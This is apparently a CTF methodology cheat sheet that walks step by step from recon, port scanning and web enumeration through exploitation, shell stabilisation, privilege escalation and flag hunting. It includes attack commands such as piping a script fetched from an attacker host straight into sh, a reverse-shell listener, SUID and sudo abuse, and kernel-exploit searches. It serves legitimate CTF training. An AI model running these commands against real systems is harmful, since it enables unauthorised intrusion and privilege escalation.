# CTF Walkthrough — Recon to Flag

> Format per step: **goal** → **3 command options**, tried in order (try #1, if it fails/unavailable/blocked, move to #2, then #3).
> Each command has a one-line note on **why you'd use it** and **what result it gives you**.
> Replace `TARGET`, `IP`, `PORT`, `FILE`, `URL` with real values. Only run against authorized targets.

---

## 1. Recon — Confirm scope & basic info
**Goal:** Learn what you're dealing with before touching anything.

1. `whois TARGET`
   → Why: quick passive lookup, no packets sent to target itself. Gives: domain registration, owner org, nameservers.
2. `host TARGET` / `dig TARGET +short`
   → Why: use when `whois` returns nothing useful (internal IP/CTF-only host). Gives: resolved IP address(es).
3. `curl -s https://api.hackertarget.com/hostsearch/?q=TARGET`
   → Why: fallback when local DNS tools are restricted/firewalled. Gives: subdomains and IPs via a third-party API.

---

## 2. Host discovery — Is it alive?
**Goal:** Confirm the target responds before scanning.

1. `ping -c 3 IP`
   → Why: fastest check. Gives: ICMP reply = host is up (may be blocked by firewalls, so a "no reply" isn't conclusive).
2. `nmap -sn IP`
   → Why: use when ICMP is blocked. Gives: host-up status using ARP/TCP probes instead of ping.
3. `nc -zv -w 2 IP 80`
   → Why: last resort when nmap itself is blocked/unavailable. Gives: confirms at least one port is reachable (proves host is alive even if ICMP/nmap fail).

---

## 3. Port scanning — Find open services
**Goal:** Enumerate open TCP/UDP ports and service versions.

1. `nmap -sC -sV -p- -oN nmap_full.txt IP`
   → Why: most thorough, default scripts + version detection on all 65535 ports. Gives: full open-port list with service/version banners (slow).
2. `nmap -sV --top-ports 1000 -T4 IP`
   → Why: use first on a slow/rate-limited network, or when you need fast results. Gives: common ports scanned quickly, usually enough to start.
3. `rustscan -a IP -- -sC -sV`
   → Why: fallback when nmap's full scan is too slow and rustscan is installed. Gives: near-instant port list, then hands off to nmap for service detection.

---

## 4. Service vulnerability enumeration — Dig into each open port
**Goal:** Identify exact software/version to find known CVEs.

1. `nmap -sV --script=vuln -p PORT IP`
   → Why: automated, broad vuln-script sweep. Gives: flags known CVEs matching detected service/version (noisy, some false positives).
2. `nc -nv IP PORT` then press Enter
   → Why: use when nmap scripts don't trigger a clean version banner. Gives: raw service banner (manual read of version string).
3. `searchsploit "service_name version"`
   → Why: once you know exact service+version (from either method above). Gives: list of known public exploits/PoCs for that version.

---

## 5. Web directory/file enumeration (if HTTP/S open)
**Goal:** Discover hidden paths not linked in the UI.

1. `gobuster dir -u http://IP:PORT -w /usr/share/wordlists/dirb/common.txt -x php,txt,html`
   → Why: fast, Go-based, good default wordlist. Gives: list of valid directories/files (200/301/403 responses).
2. `ffuf -u http://IP:PORT/FUZZ -w /usr/share/wordlists/dirb/common.txt`
   → Why: use when gobuster isn't installed or you need more filtering flexibility (`-fc`, `-fs`). Gives: same style of result with finer response filtering.
3. `dirb http://IP:PORT`
   → Why: older but reliable fallback, often pre-installed on Kali when the others aren't. Gives: slower but stable path discovery with recursive scanning.

---

## 6. Web tech fingerprinting
**Goal:** Identify CMS/framework/libraries to target known exploits.

1. `whatweb http://IP:PORT`
   → Why: fast single-command fingerprint. Gives: CMS, server, JS libraries, and plugin versions.
2. `curl -sI http://IP:PORT`
   → Why: use when whatweb isn't installed. Gives: raw HTTP headers (Server, X-Powered-By) revealing stack info.
3. Browser → View Page Source / Wappalyzer extension
   → Why: use when the site is JS-heavy and curl/whatweb miss client-rendered clues. Gives: visual confirmation of frameworks via rendered DOM/network tab.

---

## 7. Source/file inspection — Look for leaked clues
**Goal:** Find hints, credentials, or hidden routes in plain sight.

1. `curl -s http://IP:PORT/robots.txt`
   → Why: first and fastest check. Gives: disallowed paths often pointing to admin/hidden pages.
2. `curl -s http://IP:PORT | grep -iE "flag|password|key|TODO"`
   → Why: use when robots.txt is empty/missing. Gives: any plaintext hints left in HTML comments or source.
3. `view-source:http://IP:PORT` in browser (manual read)
   → Why: fallback when grep misses context (e.g. hint split across lines/JS). Gives: full human-readable page source to scan manually.

---

## 8. Vulnerability research — Map version to exploit
**Goal:** Find a public exploit for the identified service/version.

1. `searchsploit "service_name version"`
   → Why: offline, fast, no internet needed if DB is updated. Gives: local Exploit-DB matches with PoC paths.
2. `searchsploit -m <exploit_path>` then review the script
   → Why: once you find a candidate from step 1. Gives: copies the exploit locally so you can read/adapt it.
3. Google dork: `site:github.com "service_name" "version" exploit`
   → Why: use when searchsploit has nothing (newer CVE, custom app). Gives: community PoCs, writeups, or GitHub exploit repos.

---

## 9. Exploitation — Gain initial access
**Goal:** Use/adapt an exploit to compromise the vulnerable service.

1. `python3 exploit.py --target IP --port PORT`
   → Why: run a downloaded/adapted PoC directly. Gives: shell, file read, or auth bypass depending on exploit.
2. `msfconsole -q -x "use exploit/path; set RHOSTS IP; set RPORT PORT; run"`
   → Why: use when a Metasploit module exists for the CVE — more reliable than a raw script. Gives: automated exploitation + payload handling.
3. Manual request via Burp Suite Repeater
   → Why: fallback for web vulns (SQLi/SSRF/auth bypass) where scripted exploits don't fit the app's exact flow. Gives: full control to craft/replay the exact malicious request.

---

## 10. Shell stabilization
**Goal:** Turn a raw reverse shell into a usable interactive TTY.

1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
   → Why: most common, works if Python is on target. Gives: proper TTY with tab-completion/history.
2. `script /dev/null -c bash`
   → Why: use when Python isn't available on target. Gives: similar TTY upgrade using `script` instead.
3. `rlwrap nc -lvnp PORT` (on your attacker machine, before catching the shell)
   → Why: fallback set up ahead of time when target has neither Python nor script. Gives: local line-editing/history on your end even with a dumb shell.

---

## 11. Local enumeration — Look for privesc paths
**Goal:** Spot misconfigurations (SUID, cron jobs, writable files, creds).

1. `curl http://YOUR_IP/linpeas.sh | sh`
   → Why: most thorough automated enum script. Gives: color-coded report of likely privesc vectors.
2. `python3 -m http.server` (attacker) + `wget http://YOUR_IP:8000/linpeas.sh` (target)
   → Why: use when `curl | sh` is blocked or target has no curl. Gives: same linpeas output via a different transfer method.
3. Manual checks: `find / -perm -4000 2>/dev/null` and `sudo -l`
   → Why: fallback when no enum script can be transferred at all (restricted shell). Gives: SUID binaries list and sudo permissions directly.

---

## 12. Privilege escalation — Get root/admin
**Goal:** Exploit whatever misconfiguration enumeration found.

1. `sudo -l` → check GTFOBins for listed binary
   → Why: fastest win if misconfigured sudo rules exist. Gives: direct root shell via an allowed binary (e.g. `sudo vim`, `sudo find`).
2. `find / -writable -not -path "/proc/*" 2>/dev/null`
   → Why: use when sudo is locked down. Gives: writable files/paths you might hijack (cron scripts, configs) for privesc.
3. Kernel exploit: `uname -a` → match against `searchsploit linux kernel <version>`
   → Why: last resort when no config misuse is found. Gives: a kernel-level exploit (riskier, can crash the box — use carefully in CTF only).

---

## 13. Flag hunting — Locate the flag file
**Goal:** Find the flag once you have sufficient privileges.

1. `find / -iname "*flag*" 2>/dev/null`
   → Why: broadest, catches most naming conventions. Gives: list of file paths containing "flag" in the name.
2. `grep -r "flag{" / --include=*.txt 2>/dev/null`
   → Why: use when the flag file isn't named "flag" but the content format is known (e.g. `flag{...}`). Gives: file paths containing the actual flag pattern.
3. `find / -newer /etc/hostname -type f 2>/dev/null`
   → Why: fallback when neither name nor format search hits — finds recently modified/added files. Gives: candidate files added specifically for the challenge.

---

## 14. Flag extraction — Read and submit
**Goal:** Print the flag content and submit it on the scoreboard.

1. `cat /root/flag.txt`
   → Why: standard, works for plaintext flags. Gives: flag printed directly to terminal.
2. `base64 -d flag.txt` or `xxd flag.txt`
   → Why: use if `cat` output looks encoded/garbled. Gives: decoded flag from base64/hex-obfuscated file.
3. `strings flag_binary | grep "flag{"`
   → Why: fallback when the "flag file" is actually a binary/image with embedded text. Gives: extracts readable flag string from binary data.

---

## 15. Cleanup & writeup
**Goal:** Document everything for learning/scoring.

1. `mkdir -p writeup && cp nmap_full.txt writeup/`
   → Why: preserve raw scan evidence. Gives: organized folder of your output logs.
2. `script writeup/terminal_log.txt` (run before starting, `exit` when done)
   → Why: use proactively next time to capture the full session, not just saved outputs. Gives: complete command+output transcript.
3. Manual markdown writeup (`writeup/README.md`) summarizing steps + screenshots
   → Why: always do this regardless of the above — raw logs alone aren't readable later. Gives: a shareable, scoring-ready report of your methodology.

---

### Category-specific quick starts (3 options each)

**Reverse Engineering** — identify binary type/protections
1. `file FILE` → Why: instant, tells arch/format. Gives: ELF/PE/arch info.
2. `checksec --file=FILE` → Why: use once you confirm it's a binary. Gives: protections (NX, PIE, canary, RELRO).
3. `ghidra` / `radare2 -A FILE` → Why: fallback for deep analysis when file+checksec isn't enough. Gives: disassembly/decompiled pseudocode.

**Crypto** — identify cipher/encoding
1. `echo "CIPHERTEXT" | base64 -d` → Why: most common first guess. Gives: decoded output if it was base64.
2. `cyberchef` (web, "magic" wand) → Why: use when base64 fails or encoding is unknown. Gives: auto-detected encoding chain.
3. `python3 -c "from Crypto.Util.number import *; print(...)"` (manual crypto math) → Why: fallback for structured crypto (RSA, XOR) needing real computation. Gives: recovered plaintext/key via math.

**Forensics** — extract hidden data
1. `exiftool FILE` → Why: fast metadata check. Gives: EXIF data, sometimes a flag hidden in comments/GPS fields.
2. `binwalk -e FILE` → Why: use when metadata is clean but file size seems too large. Gives: extracted embedded files/archives.
3. `steghide extract -sf FILE` / `zsteg FILE` → Why: fallback when binwalk finds nothing — check for steganography. Gives: hidden data extracted from image/audio LSBs.

**Pcap/Network**
1. `wireshark FILE.pcap` → Why: visual, best for exploring unknown traffic. Gives: full protocol breakdown, filterable streams.
2. `tshark -r FILE.pcap -Y "http"` → Why: use when no GUI is available (headless/server). Gives: same filtering via CLI.
3. `strings FILE.pcap | grep -i flag` → Why: quick fallback for simple challenges. Gives: raw flag text if sent unencrypted.

**Pwn**
1. `checksec --file=./binary` → Why: first step, decides exploit technique. Gives: protection flags (NX/PIE/Canary/RELRO).
2. `gdb -q ./binary` + `pattern create` (pwndbg/GEF) → Why: use after checksec to find crash offset. Gives: exact buffer-overflow offset.
3. `python3 -c "from pwn import *; ..."` (pwntools exploit script) → Why: final step to automate payload delivery. Gives: scripted, repeatable exploitation against local/remote binary.
